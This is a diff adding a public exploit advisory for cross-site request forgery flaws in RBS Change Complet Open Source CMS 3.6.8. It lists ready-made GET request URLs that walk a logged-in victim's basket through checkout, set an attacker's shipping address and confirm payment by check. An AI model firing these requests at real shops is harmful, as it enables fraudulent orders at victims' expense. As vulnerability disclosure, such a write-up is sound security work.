@@ -1,0 +1,47 @@
+# Exploit Title: RBS Change Complet Open Source multiple CSRF vulnerabilities POST and GET
+# Date: 10/10/2014
+# Exploit Author: KrustyHack
+# Vendor Homepage: http://www.rbschange.fr/
+# Software Link: http://www.rbschange.fr/addons/distributions/RBS-Change-complet-Open-Source,67203.html
+# Version: 3.6.8
+# Tested on: Chrome, Firefox
+
+DESCRIPTION
+===========
+
+Multiple CSRF vulnerabilities into RBS CHange Complet Open Source CMS which allow an attacker to tricks a regular logged in user by executing basket related commands like adding a product to the basket, setting a new shipping address, setting delivery mode, confirm basket and in some case confirm payment (tested with payment by check), ... 
+
+These tricks can be done by an HTML POST form or by a simple GET request (a link that the victims click on, an image that the victims see, ...).
+
+HOW TO
+======
+
+First, the attacker need to know some paramaters as shopId, productId and other forms variables wich may differ regard to the CMS installation. It's not very difficult, he just need to register an account and look for a product then pick the differents variables by inspecting the HTML code.
+
+He need to look for all the checkout process urls wich can differ on all RBS Change installation (due to urls rewritting).
+
+In these examples we use the demo.rbschange.fr website wich is the demonstration site of the CMS.
+
+Text marked [VAR] need to be modified by the attacker and may need HTML code inspection.
+
+
+- Add to basket: /fr/action/order/AddToCart?quantity=1&shopId=SHOPID&productId=PRODUCTID
+
+- Checkout: /fr/website/Mon-panier,13494.html?orderParam[website_BlockAction_submit][cartb_9][Order]="Je commande" GET OK
+
+- Setting the shipping address: /fr/website/Commande-Adresse,13502.html?orderParam[billing-registered]=15&orderParam[billing-firstname]=[VICTIMFIRSTNAME]&orderParam[billing-lastname]=[VICTIMLASTNAME]&orderParam[billing-addressline1]="[VICTIMSTREET]"&orderParam[billing-zipcode]=[VICTIMZIPCODE]&orderParam[billing-city]=[VICTIMCITY]&orderParam[billing-country]=[COUNTRYCODE]&orderParam[shipping-usesameaddress]=0&orderParam[shipping-registered]=15&orderParam[shipping-firstname]=Krusty&orderParam[shipping-lastname]=Hack&orderParam[shipping-addressline1]="15, rue du oui"&orderParam[shipping-zipcode]=75000&orderParam[shipping-city]=Paris&orderParam[shipping-country]=[COUNTRYCODE]&orderParam[submited]=99k&orderParam[website_BlockAction_submit][stdAddressStepb_9][nextStep]="Continuer la commande"
+
+- Setting delivery mode: /fr/website/Commande-Livraison,13503.html?orderParam[shippingFilterId]=[SHIPPINGFILTERID]&orderParam[website_BlockAction_submit][stdShippingStepb_9][nextStep]="Continuer la commande"
+
+- Setting payment method: http://demo.rbschange.fr/fr/website/Commande-Paiement.html?orderParam[paymentFilterId]=[PAYMENTFILTERID]&orderParam[website_BlockAction_submit][stdBillingStepb_9][nextStep]="Continuer la commande"
+
+- Confirm payment (here it's a payment by check): http://demo.rbschange.fr/fr/action/payment/BankResponseCheque?accept=1&paymentParam%5Baccept%5D=1
+
+- And it's done. All the checkout process was done.
+
+Warning: nextStep (e.g: orderParam[website_BlockAction_submit][stdBillingStepb_9][nextStep]="Continuer la commande") variables may differ according to the language used into the website. HTML code inspection again ! :)
+
+WHY
+===
+
+All the forms doesn't use neither proper verification of HTTP request origin nor CSRF token. And all forms allow both GET and POST request.
